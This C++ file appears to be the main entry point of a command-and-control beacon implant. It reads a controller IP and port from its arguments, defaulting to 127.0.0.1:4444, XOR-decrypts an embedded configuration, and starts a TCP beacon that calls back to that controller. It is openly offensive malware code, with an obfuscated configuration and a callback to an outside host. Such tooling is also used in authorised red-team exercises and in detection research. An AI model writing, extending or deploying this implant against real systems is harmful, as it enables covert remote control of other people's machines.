#include "BeaconTcp.hpp"

#include "cryptDef.hpp"


using namespace std;


int main(int argc, char* argv[])
{	
	std::string ip = "127.0.0.1";
	if(argc > 1)
		ip = argv[1];

	int port = 4444;
	if (argc > 2)
		port = atoi(argv[2]);

	std::string configDecrypt(std::begin(_EncryptedBeaconHttpConfig_), std::end(_EncryptedBeaconHttpConfig_));
    std::string keyConfig(std::begin(_KeyConfig_), std::end(_KeyConfig_));
    XOR(configDecrypt, keyConfig);

	std::unique_ptr<Beacon> beacon;
	beacon = make_unique<BeaconTcp>(configDecrypt, ip, port);

	beacon->run();
}